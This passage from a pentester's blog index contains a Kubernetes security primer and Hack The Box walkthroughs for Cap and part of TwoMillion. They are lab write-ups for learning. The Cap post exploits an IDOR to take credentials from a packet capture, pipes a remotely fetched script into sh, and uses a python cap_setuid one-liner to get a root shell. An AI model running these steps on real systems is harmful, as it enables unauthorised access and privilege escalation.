access. It\u0026rsquo;s an excellent box for anyone learning local privilege escalation techniques and digging into command injection through poorly sanitised SUID binaries.","title":"HTB Boardlight Walkthrough"},{"content":"\nIntroduction For anyone in cybersecurity, two questions inevitably arise: What is Kubernetes, and what are the common security risks associated with it? These topics often seem complicated or are explained in overly technical terms.\nThis series provides a practical, hands-on journey through Kubernetes security. I will break down complex concepts into simple explanations, covering:\nKubernetes fundamentals Setting up K8s pentesting labs Common security issues and exploitation techniques Remediation and defense strategies I hope this series will transform your understanding of Kubernetes security. Let\u0026rsquo;s dive in.\nWhat and Why of Kubernetes? The name Kubernetes originates from Greek, meaning helmsman or pilot. The abbreviation K8s comes from counting the eight letters between \u0026ldquo;K\u0026rdquo; and \u0026ldquo;s\u0026rdquo;. Google open-sourced the Kubernetes project in 2014.\nCompanies use Kubernetes for several key reasons:\nAutomated deployment and scaling - Deploy applications and scale them automatically based on demand Self-healing - Restarts failed containers, replaces unhealthy ones, and reschedules workloads when nodes fail Load balancing and service discovery - Distributes traffic efficiently and allows services to find and communicate with each other Storage orchestration - Manages persistent and ephemeral storage for applications RBAC and security controls - Implements access control, network policies, and secrets management for secure workloads One of the best examples we can see nowadays is JioHotstar. They have shared multiple blogs on Kubernetes, including how they shifted their entire infrastructure from Amazon EC2 to Kubernetes and how they scaled up during special events like IPL or the Cricket World Cup. If you\u0026rsquo;re interested in real-world Kubernetes engineering insights, I highly recommend checking out their blog at blog.hotstar.com.\nIt\u0026rsquo;s important to understand that such large-scale implementations help us see the real security challenges that come with Kubernetes. As we dive deeper into Kubernetes pentesting, we\u0026rsquo;ll explore potential misconfigurations, security risks, and how to protect such critical infrastructure.\nKubernetes Architecture Let\u0026rsquo;s understand the Kubernetes architecture using this simple diagram.\nA Kubernetes deployment is called a cluster. A cluster consists of at least one Control Plane (also called Master Node) and one or more Worker Nodes. These can be physical devices, virtual machines, or instances in the cloud.\nControl Plane The Control Plane is the central management layer that maintains the desired state of the cluster. Itâ€™s essentially the â€œbrainâ€ of the Kubernetes cluster, making decisions about scheduling, detecting events, and ensuring the cluster operates as intended.\nKey components include the API server, etcd, controller manager, scheduler, and cloud controller manager. It receives information about cluster activity and requests, then uses this information to adjust cluster resources to the desired state. It decides which nodes should run which pods, ensuring optimal resource utilization. In production environments, the control plane usually runs across multiple machines for fault tolerance and high availability. The Control Plane runs on dedicated master nodes, separate from worker nodes that run the actual application workloads. This separation ensures high availability and reliability of the management components.\nWorker Node A worker node, or simply a node, is a physical or virtual machine that runs containerized applications (Pods) in a Kubernetes cluster. While the Control Plane manages the cluster, worker nodes execute workloads by hosting and running Pods.\nEach node can run multiple Pods, depending on its available resources. Worker nodes communicate with the Control Plane to receive instructions and report status. As the core of the Kubernetes data plane, worker nodes handle application execution and networking, ensuring seamless communication between services within and outside the cluster. If the Control Plane is the brain of Kubernetes, then worker nodes are its muscles, executing tasks and running applications. Control Plane Components Kube Control Manager In Kubernetes, a controller is a control loop that watches the shared state of the cluster through the API server and makes changes to move the current state toward the desired state.\nThe kube-controller-manager component is a collection of multiple controllers included in a single binary. This design reduces complexity by running all controllers in a single process. Itâ€™s responsible for running multiple controllers that maintain the desired state of the cluster.\nExamples of controllers include the replication controller, endpoints controller, namespace controller, and service accounts controller.\nThe kube-controller-manager constantly monitors the clusterâ€™s state through the Kubernetes API server, tracking the configuration of Pods, Deployments, Services, and other resources. It compares the desired state (as defined in Kubernetes manifests) with the actual state to identify discrepancies. When deviations are detected, the appropriate controllers take action to rectify the situation, such as scaling Pods, restarting failed containers, or recreating resources as needed. Etcd etcd is a fast and highly available distributed key-value database that Kubernetes uses to store all cluster data. Each resource in a cluster has a key in the database. Essentially, etcd stores all cluster data from which the API server can collect and decide how to bridge the current and desired state. Scheduler In Kubernetes, scheduling ensures that Pods are matched to Nodes so that the Kubelet can run them. A scheduler watches for newly created Pods that have no Node assigned. For every Pod that the scheduler discovers, it becomes responsible for finding the best Node for that Pod to run on. The kube-scheduler is a control plane component that determines which node a Pod will run on, ensuring pods are assigned to suitable nodes based on resource availability and constraints. Cloud Controller Manager The cloud-controller-manager is a Kubernetes control plane component that manages cloud-specific operations. It connects your cluster to your cloud providerâ€™s API and separates cloud platform interactions from cluster-only operations. This decoupling of cloud infrastructure logic allows cloud providers to develop and release their features independently from the main Kubernetes project. The cloud-controller-manager uses a plugin architecture, enabling various cloud providers to integrate their platforms with Kubernetes. Worker Node Components Kubelet The kubelet is the main Kubernetes agent that runs on every worker node and is responsible for running the actual containers. Its primary job is to watch the API server for new work tasks. When it detects a task, it executes it and maintains a reporting channel back to the control plane. If the kubelet cannot execute a task, it reports back to the control plane, which then decides what action to take. Kube-proxy Kube-proxy runs on every node and handles local cluster networking by routing network communication between pods and the network. It assigns each node a unique IP address and implements local tables or IPVS rules to manage the routing and load balancing of Pod network traffic. Container Runtime Each node requires a container runtime. The kubelet relies on this runtime to perform container-related tasks such as pulling images, starting containers, and stopping containers. Security Landscape Overview As organizations rapidly migrate to Kubernetes, security teams find themselves in a paradox: the very features that make containers powerful like isolation, orchestration, and their ephemeral nature also create unique security blind spots that traditional tools canâ€™t address.\nConverting monolithic application deployments into microservices using Kubernetes streamlines the entire process. But does this mean itâ€™s a more secure architecture? No. Kubernetes has multiple components that can be easily misconfigured and become targets for attackers. These misconfigurations are commonly overlooked when deploying applications. Ignoring such basic configuration settings can lead to serious security vulnerabilities.\nThe Kubernetes Security Report 2025 by Wiz reveals several concerning findings:\n21% of publicly exposed pods are running with at least one critical or high vulnerability. Over 9% of pods have sensitive host mapping, and 10% of pods are running as root. More than 60% of clusters exposed sensitive information like secrets and config maps. Many clusters lack proper network segmentation or access controls. These statistics highlight that securing Kubernetes requires a deeper understanding of its architecture, configurations, and runtime behavior not just default deployments or surface-level hardening.\nThe gap between Kubernetes adoption and security maturity creates a critical window of vulnerability for many organizations. In most cases, security is implemented after operational deployment and that delay is part of the problem.\nTo accelerate and strengthen security implementation, weâ€™ve seen significant research and tooling development around Kubernetes. The Cloud Native Computing Foundation (CNCF) has developed comprehensive security frameworks, and numerous specialized tools have emerged for Kubernetes security assessment and hardening. Notable tools include Kube-bench, Calico, KubeLinter, Kube-hunter, Kubeaudit, Kubescape, Cilium, Falco, Checkov, and many more.\nIntroduction Kubernetes Threat Modeling Before diving into attacks, itâ€™s important to understand the complexity of Kubernetes. It consists of multiple interconnected components. The API Server acts as the central control point, the Control Plane manages cluster operations, Pods host your applications, and etcd stores all cluster state and configuration data. This architectural complexity creates both power and risk. This is precisely why threat modeling becomes essential for Kubernetes environments.\nMicrosoft has developed a comprehensive threat matrix specifically for Kubernetes that catalogs the most common attack techniques and tactics. This matrix serves as both a checklist and a roadmap, helping security teams understand not just what attacks are possible, but how they typically unfold in real-world scenarios.\nYou can use tools like Mermaid or diagrams.net to visualize your own Kubernetes threat models.\nMicrosoft Threat Matrix for Kubernetes One of the most widely recognized frameworks for understanding Kubernetes threats is the Microsoft Threat Matrix. It maps out common attacker goals and techniques specific to Kubernetes environments. Some notable examples include exposed sensitive interfaces, sidecar injection, and privilege escalation through service account tokens.\nThis matrix provides a structured way to visualize how attackers can navigate through various components of a cluster-making it an essential reference for anyone building a Kubernetes threat model.\nThese techniques serve as a starting point for building a tailored threat model based on your specific cluster configuration and risk surface.\nAttack Paths in Kubernetes Key Kubernetes components from a threat modeling lens:\nAPI Server: Validates and configures data for API objects including pods, services, replication controllers, and others etcd: Fast and highly available distributed key-value database Kubelet: Main Kubernetes agent that runs on every worker node and is responsible for running the actual containers Control Plane: Manages clusters and resources such as worker nodes and pods Node: Physical or virtual machine in the cluster that runs your application containers How attackers exploit these components and impact of it:\nAPI Server: Unauthorized access or privilege escalation via insecure RBAC or misconfigured API endpoints can lead to full cluster compromise etcd: Access to unencrypted etcd data store exposes secrets, configurations, and credentials, enabling full control over the cluster Kubelet: Exploitation of insecure Kubelet API or read-only port allows attackers to execute commands on pods or extract sensitive data Control Plane: Compromise of control plane components allows attackers to manipulate workloads, scheduling, and cluster-wide behavior Node: Container escape or compromised node via vulnerable runtime leads to host-level compromise and lateral movement within the cluster Conclusion: Why Kubernetes Threat Modeling is Crucial Kubernetes is not just an container orchestration platform. Itâ€™s complex distributed system where it helps to make entire deployment process easy and flexible but it also comes with misconfigurations, trust boundaries and expanded attack surface.\nThatâ€™s where Threat modeling comes into the picture.\nThreat modeling helps you in:\nUnderstand how an attacker thinks by identifying the components and trust boundaries Prioritize the defense based on the real world risk not just compliance related checks Uncover the possibly weakest path ealy before they\u0026rsquo;re exploited in production TL;DR Threat modeling in kubernetes is not an optional - Itâ€™s early warning system\nTransform chaos into clarity Turn assumption into verified controls Helps to prevent security breach before it starts. In a Kubernetes environment, where shared responsibility, and rapid deployments are the norm, threat modeling provides a structured way to think offensively while acting defensively.\nReferences https://medium.com/devops-mojo/kubernetes-architecture-overview-introduction-to-k8s-architecture-and-understanding-k8s-cluster-components-90e11eb34ccd https://www.wiz.io/reports/kubernetes-security-report-2025 https://blog.hotstar.com/ https://www.wiz.io/blog/making-sense-of-kubernetes-initial-access-vectors-part-1-control-plane https://notes.kodekloud.com/ https://www.wiz.io/academy/top-kubernetes-security-tools https://microsoft.github.io/Threat-Matrix-for-Kubernetes https://offensivebytes.com/offensive-container-security Coming next In the next blog post, we will shift from theory to action, exploring initial access and reconnaissance techniques in Kubernetes.\nWe will also examine how exposed clusters are attacked and what you can do to stop them.\nStay tuned. The attack surface is waiting.\n","permalink":"https://bhavik-kanejiya.github.io/blog/kubernetes-security-basics-from-a-pentesters-point-of-view/","summary":"Explore Kubernetes security from a pentester\u0026rsquo;s point of view. Follow a hands-on walkthrough from reconnaissance to root access, focusing on network packet analysis, exploitation techniques, and cluster misconfigurations","title":"Kubernetes Security Basics: From a Pentesterâ€™s Point of View"},{"content":"Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/Cap Box Status Retired About Box Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions, including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR), giving access to another user\u0026rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. Footprinting Nmap Let\u0026rsquo;s start with scanning the machine IP with nmap to check what are the services are running on different ports!\n\u0026gt; nmap -p- --min-rate 10000 10.10.10.245 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:52 IST Warning: 10.10.10.245 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.245 Host is up (0.22s latency). Not shown: 65419 closed tcp ports (conn-refused), 113 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 25.15 seconds \u0026gt; nmap -sCV -p 21,22,80 10.10.10.245 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:53 IST Nmap scan report for 10.10.10.245 Host is up (0.23s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn |_http-server-header: gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:27 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:19 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:20 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94SVN%I=7%D=11/4%Time=6728D8D7%P=aarch64-unknown-linux-g SF:nu%r(GetRequest,2F4C,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\n SF:Date:\\x20Mon,\\x2004\\x20Nov\\x202024\\x2014:23:19\\x20GMT\\r\\nConnection:\\x2 SF:0close\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Lengt SF:h:\\x2019386\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang SF:=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x SF:20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\ SF:\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initi SF:al-scale=1\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20typ SF:e=\\\u0026#34;image/png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.mi SF:n\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/stati SF:c/css/font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesh SF:eet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;lin SF:k\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x SF:20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carous SF:el\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34; SF:/static/css/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(H SF:TTPOptions,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x SF:20Mon,\\x2004\\x20Nov\\x202024\\x2014:23:20\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x SF:20GET,\\x20HEAD\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTT SF:P/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type SF::\\x20text/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x SF:20\u0026lt;body\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20Invalid\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp; SF:#x27;RTSP/1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRe SF:quest,189,\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nD SF:ate:\\x20Mon,\\x2004\\x20Nov\\x202024\\x2014:23:27\\x20GMT\\r\\nConnection:\\x20 SF:close\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length SF::\\x20232\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x2 SF:03\\.2\\x20Final//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20F SF:ound\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20t SF:he\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20ple SF:ase\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 145.37 seconds We can see that machine has port 21,22 and 80 (3 TCP) ports are open.\nLetâ€™s add Cap host to our /etc/hosts file:\necho \u0026#34;cap.htb 10.10.10.245\u0026#34; \u0026gt; sudo tee -a /etc/hosts Port 21 FTP We tried to login into FTP as anonymous user since we don\u0026rsquo;t have username and password for any of the services.\nftp 10.10.10.245 Connected to 10.10.10.245. 220 (vsFTPd 3.0.3) Name (10.10.10.245:pixel): anonymous 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed Port 22 SSH We tried same thing for SSH. We login into ssh as anonymous but it\u0026rsquo;s also an failed attempt.\nssh anonymous@10.10.10.245 anonymous@10.10.10.245\u0026#39;s password: Permission denied, please try again. Port 80 HTTP It is running flask applicaiton that contains the Security Events, Faliled Login Attempts and Port Scan related detail.\nApplicaiton also contains the Security Snapshots that belongs to user Nathan. We can see the refernece from the machine description that we have to find IDOR somewhere in the application.\nAs we can see that, URL contains the numeric ID for the Security Snapshot. We can change the ID and try to see we can access other user\u0026rsquo;s Security Snapshots or not!\nWe changed the ID from 2 to 0 and as we can see result as Snapshot results are getting changed.\nDownload the pcap file and analzye it to see whether we can find anything interesting or not.\nWireshark We can see that, pcap file contains the network logs. After further analysis we found that it contains the user name and password of the user nathan. We can use this credentials to login into FTP and SSH.\nWe can use zeek tool to analyze the pcap file in easy way. Refers to Analyzing PCAP with Zeek - HTB Sherlocks - KnockKnock video by ippsec ğŸ™Œ\nGetting User shell We already got the user credentials from the pcap file analysis. Which we can use into FTP first to see it\u0026rsquo;s valid credentials or not?\nCredentials:\nUsername: nathan Password: ########### FTP Login ftp cap.htb Connected to cap.htb. 220 (vsFTPd 3.0.3) Name (cap.htb:pixel): nathan 331 Please specify the password. Password: 230 Login successful. Run dir command to list the files and folders\nftp\u0026gt; dir 229 Entering Extended Passive Mode (|||13483|) 150 Here comes the directory listing. -r-------- 1 1001 1001 33 Nov 04 14:22 user.txt 226 Directory send OK. Run the get command download the file and we can see we have our first user.txt flag with us..!\nftp\u0026gt; get user.txt We are able to login into FTP using nathan\u0026rsquo;s credentials and we already have our first user.txt flag.\nGetting Root shell SSH Login ssh nathan@cap.htb Login into SSH to see we can find something innteresting in application code or any bash_history.\nReading the application code The Web applicaiton\u0026rsquo;s code doesn\u0026rsquo;t contain anything intersting. We can move forward to Linpease to find any other ways of exploitation.\nLinpease.sh wget 10.10.15.20:8000/linpease.sh | sh Interesting Output from linpease:\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep Before, We jump into the explitation part we have to see what is cap_setuid and how it can be used for privilege escalation?\nWhat is Capabilities and cap_setuid? In Linux, capabilities are like permissions that let specific programs do things only the root (administrator) user usually can. Instead of giving full root access, capabilities let a program use just the parts of root access it needs. For example:\nCAP_NET_BIND_SERVICE: Allows a program to use network ports usually reserved for root. CAP_SETUID: Lets a program change its user ID (UID), essentially letting it switch users. How can cap_setuid can be used for Privilege Escalation? The cap_setuid capability is interesting because it lets a program switch its user ID to any user, including the root user.\nHow to find the programs with cap_setuid? getcap -r / 2\u0026gt;/dev/null | grep cap_setuid Command Explanation:\n\u0026ldquo;getcap\u0026rdquo; is the main command that finds and outputs the capabilities. \u0026ldquo;-r / \u0026quot; means to search recursively in the root directory, which means in the whole file system. \u0026ldquo;2\u0026gt;/dev/null\u0026rdquo; does not output any errors which mostly caused by inaccessible directories. Get the Root We already have get detailed information on how cap_setuid can be used for privilege escalation\n/usr/bin/python3.8 -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; Now, we have the root shell and we can read the flag..!\nroot@cap:~# cat /root/root.txt ############################### Conclusion Cap is an excellent machine for beginners as it teaches essential reconnaissance and basic privilege escalation techniques. The walkthrough covers every phase in detail, giving insights into each command used.\nKey Takeaways Thorough enumeration can reveal important information. Pay attention to SUID binaries for privilege escalation. References https://www.youtube.com/watch?v=O_z6o2xuvlw https://0xdf.gitlab.io/2021/10/02/htb-cap.html https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/ Connect with Me LinkedIn Twitter GitHub Hack The Box ","permalink":"https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/","summary":"Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques","title":"HTB Cap Walkthrough"},{"content":"Box Info Attribute Details Level Easy OS Linux Box URL HTB-TwoMillion Box Status Retired About Box TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell. Footprinting Nmap nmapÂ finds two open TCP ports, SSH (22) and HTTP (80):\n\u0026gt; nmap -p- --min-rate 10000 10.10.11.221 Nmap 7.94SVN scan initiated Sat Jan 18 17:24:20 2025 as: nmap -p- --min-rate 10000 -oN 1.basic.nmap.txt 10.10.11.221 Nmap scan report for 10.10.11.221 Host is up (0.22s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sat Jan 18 17:24:42 2025 -- 1 IP address (1 host up) scanned in 21.88 seconds \u0026gt; nmap -sCV -p 22,80 10.10.11.221 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 17:35 IST Nmap scan report for 10.10.11.221 Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds Letâ€™s add 10.10.11.221 host to our /etc/hosts file:\necho \u0026#34;10.10.11.221 2million.htb\u0026#34; | sudo tee -a /etc/hosts Port - 22 Enumeration We tried the same thing for SSH. We login into SSH anonymous but it\u0026rsquo;s also a failed attempt.\nssh anonymous@10.10.10.245 anonymous@10.10.10.245\u0026#39;s password: Permission denied, please try again. Port - 80 Enumeration Response Headers HTTP/1.1 200 OK Server: nginx Date: Sun, 19 Jan 2025 08:32:05 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive Set-Cookie: PHPSESSID=srsk0h13obnn855016i953mfd7; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Technology Detection Application Overview The application resembles HTB\u0026rsquo;s old version from 2017. It includes pages such as Login, Invite, Hall of Fame, and FAQ.\nThe the old version of HTB requires an invitation code for the user Sign\nI tried to play with the invitation code option and observed that the application is calling the 2 Javascript files that are being used to send API requests. We tried to see what the both js file contains.\nObfuscated Code We found that the supposed to be inviteapi.min.js is responsible for sending the invitation validation request. The JavaScript file contains multiple keywords like POST, makeInviteCode, verifyInviteCode so looks like it is obfuscated.\nWe used de4js JavaScript Deobfuscator and Unpacker to get the JavaScript in Deobfuscated format.\nDeobfuscated JavaScript:\nfunction verifyInviteCode(code) { var formData = { code: code, }; $.ajax({ type: \u0026#34;POST\u0026#34;, dataType: \u0026#34;json\u0026#34;, data: formData, url: \u0026#34;/api/v1/invite/verify\u0026#34;, success: function (response) { console.log(response); }, error: function (response) { console.log(response); }, }); } function makeInviteCode() { $.ajax({ type: \u0026#34;POST\u0026#34;, dataType: \u0026#34;json\u0026#34;, url: \u0026#34;/api/v1/invite/how/to/generate\u0026#34;, success: function (response) { console.log(response); }, error: function (response) { console.log(response); }, }); } From the deobfuscated JavaScript we can see that the JavaScript contains 2 functions.\nFunction verifyInviteCode is responsible for verifying the Invitation code. Function makeInviteCode is responsible for generating the Invitation code. Generate Invitation Token Upon sending a POST request for How-to-Generate application returns the ROT13 encrypted string.\ncurl -X POST http://2million.htb/api/v1/invite/how/to/generate 